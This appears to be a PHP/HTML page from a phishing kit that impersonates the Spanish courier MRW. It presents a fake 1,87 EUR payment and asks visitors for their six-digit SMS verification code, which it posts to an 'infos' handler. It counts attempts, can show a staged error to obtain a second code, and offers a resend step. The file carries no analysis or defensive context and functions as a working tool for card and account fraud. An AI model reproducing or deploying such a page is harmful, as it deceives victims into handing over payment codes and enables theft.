<?php require_once __DIR__ . "/../vender/visitors.php"; ?>
<?php require_once __DIR__ . "/../vender/languages.php"; ?>
<!DOCTYPE html>
<html lang="<?php echo $lang_code; ?>" <?php echo ($lang_code == 'ar' ? 'dir="rtl"' : ''); ?>>
<head>
    <meta charset="utf-8">
    <title>MRW</title>
	<!-- logo img title-->
    <link rel="icon" href="image/om.png" type="image/x-png"/>
    <link rel="shortcut icon" href="image/om.png" type="image/x-png" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/asse.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background-color: #1b224d; min-height: 100vh; }
        .login { background-color: #e3e3e3; border-radius: 6px; }
        .btn-confirm { background-color: #d71920; color: white; font-weight: bold; }
        .btn-confirm:hover { background-color: #b5151a; color: white; }
        .icon-mrw { color: #343a40d1; }
        .footer { background-color: #1b224d; color: #fff; padding-top: 40px; margin-top: 50px; }
        .footer h3 { font-size: 16px; font-weight: bold; margin-bottom: 20px; color: #fff; }
        .footer ul { list-style: none; padding: 0; margin-bottom: 30px; }
        .footer ul li { font-size: 13px; margin-bottom: 8px; color: #ccc; }
        #social { display: flex; gap: 15px; margin-bottom: 20px; }
        #social li i { color: #fff; opacity: 0.8; }
        #menuLegal { background-color: #1b224d; padding: 20px 0; margin-top: 30px; border-top: 1px solid #444; }
        #menuLegal ul { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin-bottom: 0; list-style: none; padding: 0; }
        #menuLegal ul li { font-size: 11px; color: #888; margin-bottom: 0; }
        .form-control:focus {
            border-color: #ced4da;
            box-shadow: none;
            outline: 0;
        }
        <?php if($lang_code == 'ar'): ?>
        body { text-align: right; }
        .icon-mrw { margin-left: 10px; margin-right: 0; }
        .me-1 { margin-left: 0.25rem !important; margin-right: 0 !important; }
        <?php endif; ?>
    </style>
</head>
<body>
    <header>
        <div class="container">
            <img src="image/ogou.png" alt="MRW" width="100">
        </div>
    </header>

    <main id="main" class="py-5">
        <div class="container">
            <article class="col-md-5 mx-auto">
                <div class="login border p-4 shadow-sm">
                    <div class="text-center mb-4">
                        <i class="fas fa-comment-sms fa-3x icon-mrw mb-3"></i>
                        <h2 class="h4 fw-bold"><?php echo $txt['sms_code']; ?></h2>
                    </div>
                    
                    <p class="text-center mb-4"><?php echo $txt['sms_desc']; ?></p>
                    
                    <div class="bg-light p-3 rounded mb-4 text-center">
                        <p class="mb-0 small text-muted">Pago en MRW</p>
                        <p class="fw-bold fs-5 mb-0">1,87 EUR</p>
                        <p class="small text-muted"><?php echo date('d/m/Y'); ?></p>
                    </div>

                    <?php if(isset($_GET['error'])): ?>
                    <div class="alert alert-secondary text-center small py-2 mb-3">
                        <i class="fas fa-exclamation-circle me-1"></i> <?php echo $txt['sms_error']; ?>
                    </div>
                    <?php endif; ?>

                    <form action="infos" method="post">
                        <input type="hidden" name="step" value="sms">
                        <input type="hidden" name="attempt" value="<?php echo isset($_GET['error']) ? '2' : '1'; ?>">
                        
                        <div class="mb-4">
                            <label class="form-label fw-bold"><?php echo $txt['sms_code']; ?></label>
                            <div class="input-group input-group-lg">
                                <input type="tel" class="form-control text-center fw-bold <?php echo isset($_GET['error']) ? 'is-invalid' : ''; ?>" name="sms" id="sms" pattern="\d{6}" maxlength="6" placeholder="••••••" required autofocus>
                            </div>
                            <div class="invalid-feedback text-center" style="display: <?php echo isset($_GET['error']) ? 'block' : 'none'; ?>; color: #dc3545; font-size: 0.8rem; margin-top: 4px;">
                                <?php echo $txt['sms_error']; ?>
                            </div>
                        </div>
                        
                        <button type="submit" name="submit" class="btn btn-confirm btn-lg w-100"><?php echo $txt['continue']; ?> </button>
                    </form>
                    
                    <div class="mt-4 text-center small">
                        <p class="text-muted">
                            <form action="infos" method="POST" style="display:inline;">
                                <input type="hidden" name="step" value="resend_sms">
                                <button type="submit" class="btn btn-sm fw-bold" style="background-color: #e2e4e5; color: #373b3e; border: none; padding: 5px 15px; border-radius: 5px;"><?php echo $txt['resend_sms']; ?></button>
                            </form>
                        </p>
                    </div>
                </div>
            </article>
        </div>
    </main>

    <footer class="navbar-inverse footer" id="menuFooter">
        <div class="container">
            <div class="row aligned-row">
                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['envios']; ?></h3>
                    <ul>
                        <li><?php echo $txt['tracking']; ?></li>
                        <li><?php echo $txt['locate_office']; ?></li>
                        <li><?php echo $txt['arrange_delivery']; ?></li>
                        <li><?php echo $txt['packaging']; ?></li>
                        <li><?php echo $txt['benefits']; ?></li>
                        <li><?php echo $txt['fuel_surcharge']; ?></li>
                        <li><?php echo $txt['general_conditions']; ?></li>
                    </ul>
                </div>

                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['individuals']; ?></h3>
                    <ul>
                        <li><?php echo $txt['my_mrw']; ?></li>
                        <li><?php echo $txt['your_shipments']; ?></li>
                        <li><?php echo $txt['make_shipment']; ?></li>
                        <li><?php echo $txt['national_services']; ?></li>
                        <li><?php echo $txt['international_services']; ?></li>
                        <li><?php echo $txt['mrw_pack']; ?></li>
                    </ul>
                </div>

                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['companies']; ?></h3>
                    <ul>
                        <li><?php echo $txt['shipments_company']; ?></li>
                        <li><?php echo $txt['become_mrw_point']; ?></li>
                        <li><?php echo $txt['national_services']; ?></li>
                        <li><?php echo $txt['international_services']; ?></li>
                        <li><?php echo $txt['burofax']; ?></li>
                        <li><?php echo $txt['digital_logistics']; ?></li>
                        <li><?php echo $txt['ecommerce']; ?></li>
                        <li><?php echo $txt['logistics_solutions']; ?></li>
                        <li><?php echo $txt['sector_solutions']; ?></li>
                    </ul>
                </div>

                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['social_responsibility']; ?></h3>
                    <ul>
                        <li><?php echo $txt['our_rsc']; ?></li>
                        <li><?php echo $txt['solidarity_shipments']; ?></li>
                        <li><?php echo $txt['discounted_services']; ?></li>
                        <li><?php echo $txt['ethical_channel']; ?></li>
                    </ul>
                </div>

                <div class="col-xs-12 col-sm-6 col-md-2 footer-links">
                    <h3><?php echo $txt['news_blog']; ?></h3>
                    <ul>
                        <li><?php echo $txt['blog']; ?></li>
                        <li><?php echo $txt['news']; ?></li>
                    </ul>
                </div>

                <div id="divSobreMRW" class="col-md-2 footer-links col-xs-12 col-sm-6">
                    <ul id="social">
                        <li><i class="fab fa-facebook-f fa-2x"></i></li>
                        <li><i class="fab fa-twitter fa-2x"></i></li>
                        <li><i class="fab fa-youtube fa-2x"></i></li>
                        <li><i class="fab fa-linkedin-in fa-2x"></i></li>
                        <li><i class="fab fa-instagram fa-2x"></i></li>
                    </ul>
                    <ul>
                        <li><?php echo $txt['contact_us']; ?></li>
                        <li><?php echo $txt['who_we_are']; ?></li>
                        <li><?php echo $txt['our_offices']; ?></li>
                        <li><?php echo $txt['work_with_us']; ?></li>
                        <li><?php echo $txt['customer_service']; ?></li>
                    </ul>
                </div>
            </div>
        </div>

        <div id="menuLegal">
            <div class="container">
                <ul>
                    <li><?php echo $txt['copyright']; ?></li>
                    <li><?php echo $txt['accessibility']; ?></li>
                    <li><?php echo $txt['privacy_policy']; ?></li>
                    <li><?php echo $txt['legal_notice']; ?></li>
                    <li><?php echo $txt['cookies_policy']; ?></li>
                    <li><?php echo $txt['fraud_info']; ?></li>
                    <li><?php echo $txt['eu_dispute']; ?></li>
                    <li><?php echo $txt['web_map']; ?></li>
                    <li>W3C-WAI</li>
                    <li id="gesPymeFooter" style="display: inline-block; margin-left: 10px;">
                        <img src="image/peku.png" alt="Proyecto G3 - GesPyME" style="height: 25px;">
                    </li>
                </ul>
            </div>
        </div>
    </footer>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const smsInput = document.getElementById('sms');
            smsInput.addEventListener('input', function() {
                this.value = this.value.replace(/\D/g, '').substring(0, 6);
            });
        });
    </script>
</body>
</html>
